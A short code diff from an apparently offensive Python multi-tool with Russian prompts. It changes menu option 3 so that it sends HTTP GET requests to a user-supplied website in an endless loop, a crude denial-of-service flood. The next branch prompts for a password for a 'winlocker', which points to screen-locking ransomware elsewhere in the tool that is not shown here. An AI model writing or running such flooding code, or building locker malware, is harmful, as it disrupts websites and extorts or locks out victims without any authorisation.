@@ -68,20 +68,20 @@ elif num == "2":
 
 elif num == "3":
     import http.client
-
+    
     host = input("введите адрес сайта: ")
     path = "/"
 
     conn = http.client.HTTPConnection(host)
-
-    try:
-        conn.request("GET", path)
-        response = conn.getresponse()
-        print(f"Код ответа: {response.status}")
-        data = response.read()
-        print("Ответ получен успешно.")
-    except Exception as e:
-        print(f"Ошибка: {e}")
+    while True:
+     try:
+         conn.request("GET", path)
+         response = conn.getresponse()
+         print(f"Код ответа: {response.status}")
+         data = response.read()
+         print("Ответ получен успешно.")
+     except Exception as e:
+         print(f"Ошибка: {e}")
 
 elif num == "4":
     pas = input("введите пароль для винлокера: ")
